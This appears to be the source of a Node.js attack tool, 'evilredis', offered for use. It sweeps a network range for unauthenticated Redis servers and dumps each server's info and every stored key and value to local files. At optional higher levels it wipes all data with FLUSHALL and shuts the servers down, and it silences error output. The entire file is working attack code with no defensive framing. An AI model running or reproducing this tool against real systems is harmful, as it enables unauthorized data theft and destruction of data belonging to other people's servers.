var CIDR = require('cidr-js'),
    Redis = require('redis'),
    fs = require('fs'),
    cidr = new CIDR();

console.error = function(){};

var target = process.argv[2],
    evilness = 0,
    outputPath = 'output/';

if( !target ) {
  console.log( '== evilredis >:) \n\n Syntax:\tevilredis [ target ] [ level = 0 ]\n Ex.\t\tevilredis 192.168.0.0/24 1\n')
  console.log( ' - Level 0: quick scan, dump server info & keys' );
  console.log( ' - Level 1: flushall' );
  console.log( ' - Level 2: flushall & shutdown\n' );
  console.log( ' USE AT YOUR OWN RISK!' );
  process.exit();
};

if( process.argv[3] ) {
  evilness = parseInt(process.argv[3]);
};

if( !fs.existsSync( outputPath ) ) {
  fs.mkdir( outputPath );
};

console.log( ' -- Target :', target, '... evilness level', evilness, '\n' );

var hosts  = cidr.list( target );

hosts.forEach( function( host, index ) {
  var redis = Redis.createClient( 6379, host, { max_attempts: 1, retry_delay: 10 } );
  redis.keys( '*', function( err, keys ) {
    if( err ) {
      return;
    };
    var serverInfo = redis.server_info,
        prefix = ' * ' + host + ', Redis ' + serverInfo.redis_version + ', ' + serverInfo.os + ':',
        outputPrefix = outputPath + host;

    fs.appendFile( outputPrefix, JSON.stringify( serverInfo, null, 2 ) );

    redis.keys( '*', function( err, keys ) {
      console.log( prefix, 'Found', keys.length, 'keys');
      keys.forEach( function( key, index ) {
        var keysFilePath = outputPrefix + '.keys';
        redis.get( key, function( err, value ) {
          var ln = key + '\t';
          if( err ) {
            ln += 'ERR: ' + err;
          } else {
            ln += value.toString();
          };
          fs.appendFile( keysFilePath, ln + '\n');
        });
      });

      if( evilness > 0 ) {
        console.log( prefix, 'Flushall()' );
        redis.flushall(function( err, reply ) {
          if( evilness == 2 ) {
            console.log( prefix, 'Shutdown!' );
            redis.shutdown();
          };
        });
      };

    });

  });

  redis.on( 'error', function( e ) {
  });
});